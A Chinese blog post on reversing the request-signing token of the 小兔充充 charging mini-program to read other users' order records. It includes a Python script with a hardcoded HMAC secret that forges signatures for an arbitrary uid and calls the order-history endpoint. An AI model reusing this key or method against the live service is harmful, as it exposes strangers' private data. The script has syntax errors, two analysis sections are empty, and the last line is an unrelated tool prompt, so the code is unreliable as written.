---
title: 小程序 小兔充充验签token算法逆向分析到越权
date: 2026-09-20 02:16:39
categories:
  - WebSecurity
  - 小程序
tags:
  - 小程序
  - 逆向
  - 越权
---

首先，根据数据包分析
这是获取历史订单信息的数据包，可以看到请求参数由udi和token，year构成，year暂不考虑
可以确定的是uid为用户id做校验，token根据多次请求不一致可认为非身份验证token
也就是用于验签的token，那么破解token算法即可篡改uid，从而进行越权遍历
![](/images/小程序-小兔充充验签token算法逆向分析到越权/20260608231155.png)
导出数据包，分析该接口参数构成和token生成规则

人工分析

ai分析

构造请求验证

```python
import hmac
import hashlib
import requests
 # 1. 从反编译代码获取密钥（已公开）
SECRET = "6D025A4E0DF3E14139F4CD3BE"
def get_token(params: dict) -> str:
	sorted_keys = sorted(params.keys())
	param_str = "&".join([f"{k}={params[k]}" for k in sorted_keys])
	return hmac.new(SECRET.encode(), param_str.encode(), hashlib.sha1).hexdigest().upper()

params =
	{
		"uid": "5899974",
		"type":"1",
		"page":"1",
		"pageSize":"15",
		"status":"2",
		"year","2026",
		"timestamp": "1781256154"
	}
# 3. 发送请求获取他人数据
resp = requests.post("/we/order/chargeRecord", data=params) print(f"UID {params['uid']}: {resp.text}")
```

下次在 TscanPlus 扫描结果目录下，直接说"分析当前目录并生成报告"即可复用此流程。
